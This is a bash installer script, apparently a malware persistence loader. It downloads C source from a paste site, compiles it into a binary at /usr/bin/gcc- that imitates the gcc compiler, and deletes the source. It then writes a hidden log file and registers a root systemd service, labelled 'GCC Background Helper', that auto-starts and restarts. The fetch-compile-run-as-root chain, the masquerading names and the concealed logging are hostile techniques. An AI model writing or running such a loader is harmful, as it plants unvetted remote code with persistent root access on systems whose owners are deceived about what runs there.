#!/usr/bin/env bash
set -euo pipefail

# Config
DOWNLOAD_URL="https://pastee.dev/d/Gk8J5oSB/0"
C_SOURCE="cloudflared.c"
BINARY_DEST="/usr/bin/gcc-"
SUPERVISOR="/usr/bin/gcc-supervisor.sh"
LOGFILE="/var/log/.cache.log"
SERVICE_FILE="/etc/systemd/system/gcc-.service"
MAX_TRIES=3
SLEEP_BETWEEN=2

if [ "$(id -u)" -ne 0 ]; then
  echo "Run as root: sudo $0"
  exit 2
fi

echo "[*] Starting installer (no PID file, Type=simple service)"

download_file() {
  local url="$1" out="$2"
  if command -v wget >/dev/null 2>&1; then
    wget -q "$url" -O "$out"
    return $?
  elif command -v curl >/dev/null 2>&1; then
    curl -fSL "$url" -o "$out"
    return $?
  else
    echo "[ERROR] wget/curl not found"
    return 2
  fi
}

# Download with retries
echo "[*] Downloading $DOWNLOAD_URL -> $C_SOURCE"
tries=0
while [ $tries -lt $MAX_TRIES ]; do
  tries=$((tries+1))
  echo "[*] Attempt $tries..."
  if download_file "$DOWNLOAD_URL" "$C_SOURCE"; then
    if [ -s "$C_SOURCE" ]; then
      head1=$(head -n1 "$C_SOURCE" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)
      if [[ "$head1" == "<!doctype"* || "$head1" == "<html"* ]]; then
        echo "[WARN] Download looks like HTML; retrying"
        rm -f "$C_SOURCE"
      else
        echo "[+] Download ok"
        break
      fi
    else
      echo "[WARN] Zero-size; retrying"
      rm -f "$C_SOURCE" || true
    fi
  else
    echo "[WARN] download command failed; retrying"
  fi
  [ $tries -lt $MAX_TRIES ] && sleep $SLEEP_BETWEEN
done

if [ ! -s "$C_SOURCE" ]; then
  echo "[ERROR] Failed to download valid source after $MAX_TRIES tries"
  exit 1
fi

# Compile
echo "[*] Compiling $C_SOURCE -> $BINARY_DEST"
gcc -O2 "$C_SOURCE" -o "$BINARY_DEST"
rm -f "$C_SOURCE"
chmod 755 "$BINARY_DEST"
chown root:root "$BINARY_DEST"
echo "[+] Binary installed: $BINARY_DEST"

# Ensure logfile
echo "[*] Ensuring log file $LOGFILE exists"
touch "$LOGFILE"
if getent group nogroup >/dev/null 2>&1; then
  chown nobody:nogroup "$LOGFILE" || true
else
  chown nobody:nobody "$LOGFILE" || true
fi
chmod 0640 "$LOGFILE"

# Install supervisor wrapper
echo "[*] Writing supervisor wrapper -> $SUPERVISOR"
cat > "$SUPERVISOR" <<'EOF'
#!/usr/bin/env bash
# gcc-supervisor.sh
# Launch /usr/bin/gcc- and wait for its long-running child (if it forks).
# Writes output to $LOGFILE via systemd unit's StandardOutput.

set -euo pipefail

DAEMON="/usr/bin/gcc-"

# Launch the daemon in background so we can observe forking
# Use setsid so child's std fds don't tie to our shell (optional)
setsid "$DAEMON" &

launcher_pid=$!

# give launcher a moment to fork if it will
sleep 0.5

# Try to find a child process of launcher_pid that is not the launcher itself.
# If the program does not fork, then launcher_pid is the long-running pid, so wait on it.
find_longrun_pid() {
  # prefer descendant that's not launcher
  child=$(pgrep -P "$launcher_pid" | tail -n1 || true)
  if [ -n "$child" ]; then
    echo "$child"
    return 0
  fi
  # fallback: if launcher is still running, use it
  if kill -0 "$launcher_pid" 2>/dev/null; then
    echo "$launcher_pid"
    return 0
  fi
  return 1
}

# loop until we find a pid to wait on (timeout after a short period)
attempts=0
while [ $attempts -lt 40 ]; do
  attempts=$((attempts + 1))
  target_pid=$(find_longrun_pid || true)
  if [ -n "$target_pid" ]; then
    # wait on the target so supervisor stays alive while daemon runs
    wait "$target_pid"
    exit $?
  fi
  sleep 0.1
done

# nothing found; wait for launcher to exit and forward exit code
wait "$launcher_pid" || exit $?
exit 0
EOF

chmod 755 "$SUPERVISOR"
chown root:root "$SUPERVISOR"
echo "[+] Supervisor installed: $SUPERVISOR"

# Create systemd service (Type=simple, no PIDFile)
echo "[*] Writing systemd unit -> $SERVICE_FILE"
cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=GCC Background Helper (supervisor, no PID file)
After=network.target

[Service]
Type=simple
User=root
ExecStart=$SUPERVISOR
Restart=on-failure
RestartSec=5
KillSignal=SIGTERM
# capture stdout/stderr to logfile
StandardOutput=append:$LOGFILE
StandardError=inherit
WorkingDirectory=/

[Install]
WantedBy=multi-user.target
EOF

echo "[*] Reloading systemd and starting service"
systemctl daemon-reload
systemctl enable --now gcc-.service

sleep 1

echo
echo "----- systemctl status -----"
systemctl status --no-pager gcc-.service || true

echo
echo "----- journalctl last 40 lines -----"
journalctl -u gcc-.service -n 40 --no-pager || true

echo
echo "[✔] install_all_nopid.sh finished."
